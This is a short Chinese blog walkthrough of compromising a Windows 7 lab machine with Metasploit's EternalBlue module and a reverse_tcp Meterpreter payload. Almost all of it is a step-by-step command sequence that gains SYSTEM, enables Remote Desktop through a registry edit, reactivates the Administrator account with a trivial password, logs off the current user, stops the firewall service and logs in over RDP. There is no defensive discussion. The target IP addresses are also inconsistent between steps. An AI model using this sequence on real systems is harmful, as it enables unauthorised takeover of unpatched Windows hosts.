kali通过永恒之蓝漏洞入侵win7

发表于 2020-03-13 更新于 2022-07-31

具体步骤

首先，启动metasploit（推荐从开始菜单启动，会同时启动数据库服务）
使用use exploit/windows/smb/ms17_010_eternalblue加载永恒之蓝攻击模块


使用show options显示详细数据，有图知需要我们设置的只有靶机的IP

使用set rhost 192.168.209.132设置靶机IP

使用set payload windows/x64/meterpreter/reverse_tcp设置载荷（忘截屏了）
使用exploit发动攻击

成功获取shell，使用whoami查看当前身份，system用户美滋滋

使用REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f，启用远程桌面
使用net user查看所有用户，发现除了Administrator还有一个fsquirt，那么Administrator很有可能是禁用的
使用net user Administrator /active:yes激活Administrator账户

使用net user Administrator 5给Administrator设一个密码

使用query user查看当前登陆了的用户，发现fsquirt是登陆着的,ID为1
使用logoff 1注销fsquirt

再开一个终端，使用rdesktop 192.168.233.128进行远程桌面连接

发现连接不上，使用nmap 192.168.233.128扫描端口，发现3389没有开启

回到shell，使用net stop mpssvc关闭防火墙

此时靶机也提示防火墙已关闭

再次nmap 192.168.233.128扫描端口，发现3389已经开启

再次rdesktop 192.168.233.128进行远程桌面连接

账户输Administrator，密码是之前设的5，登陆

登陆成功！
